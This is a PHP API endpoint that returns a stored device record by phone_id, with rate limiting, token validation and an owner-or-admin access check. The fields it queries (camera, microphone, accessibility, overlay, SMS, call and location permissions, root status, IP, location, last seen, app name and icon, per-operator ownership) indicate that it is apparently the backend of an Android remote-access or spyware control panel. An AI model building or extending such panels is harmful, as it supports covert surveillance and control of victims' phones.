<?php
date_default_timezone_set('Asia/Shanghai');

require_once '../private/security_headers.php';
setSecurityHeaders();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $clientIp = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    rateLimitCheck('get_phone_' . $clientIp, 30, 60);

    $data = json_decode(file_get_contents('php://input'));

    if (!isset($data->phone_id) || empty($data->phone_id)) {
        http_response_code(400);
        echo json_encode(['status' => 'fail', 'message' => 'phone_id is required']);
        exit();
    }

    $phone_id = $data->phone_id;

    try {
        $pdo = getDbConnection();
        $user = validateToken($pdo);

        $stmt = $pdo->prepare("SELECT phone_id, phonename, phonemodel, phoneandroid, phonebattery, 
            phoneoperator, phonecountry, phoneip, phonelocation, phone_status, install_date, 
            usrname, display, admin, frontcam, backcam, microphone, accessibility, notification, 
            overlay, sms_permission, contacts_permission, storage_permission, call_permission,
            camera_permission, location_permission, is_rooted, screen_resolution, total_storage,
            free_storage, total_ram, free_ram, last_seen, app_name, app_icon
            FROM phones WHERE phone_id = :phone_id");
        $stmt->bindParam(':phone_id', $phone_id, PDO::PARAM_STR);
        $stmt->execute();

        $device = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($device) {
            if (($user['authorty'] ?? '') !== 'admin' && $device['usrname'] !== $user['usrname']) {
                http_response_code(403);
                echo json_encode(['status' => 'fail', 'message' => 'Access denied']);
                exit();
            }
            echo json_encode(['status' => 'success', 'device' => $device]);
        } else {
            http_response_code(404);
            echo json_encode(['status' => 'fail', 'message' => 'Device not found']);
        }
    } catch (PDOException $e) {
        http_response_code(500);
        echo json_encode(['status' => 'fail', 'message' => 'Database error']);
        error_log('[Detail] ' . $e->getMessage());
    }
} else {
    http_response_code(405);
    echo json_encode(['status' => 'fail', 'message' => 'Invalid request method']);
}
